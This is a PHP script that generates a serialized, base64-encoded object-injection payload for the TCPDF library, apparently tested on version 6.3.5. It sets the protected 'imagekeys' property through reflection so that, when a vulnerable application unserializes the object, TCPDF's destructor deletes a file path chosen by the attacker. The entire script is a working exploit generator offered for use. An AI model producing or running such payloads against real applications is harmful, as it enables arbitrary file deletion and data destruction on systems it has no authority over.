<?php
	require_once('tcpdf_import.php');

	if ($argc > 1){
		$deletionPath = $argv[1];
	} else {
		echo "usage: php " . $argv[0] . " <path_to_file> \n";
		echo "Warning! Running you will exploit yourself with this tool \n";
		exit();
	}

	//echo "Deserialization Payload for TCPDF. Tested on 6.3.5" . "\n";
	//echo "We will generate payload which deletes " . $deletionPath . "\n";
	
	// The "imagekeys" array holds file path strings.
	// When the deconstructor is called, it tries to delete all files which are supplied via imagekeys

	// "imagekeys is protected, so we need to give us access to modify it"
	$tcpdf_payload = new TCPDF();
	$reflectionClass = new ReflectionClass('TCPDF');
	$reflectionProperty = $reflectionClass->getProperty('imagekeys');
	$reflectionProperty->setAccessible(true);
	$reflectionProperty->setValue($tcpdf_payload, array($deletionPath));

	echo base64_encode(serialize($tcpdf_payload));
	echo "\n";
?>
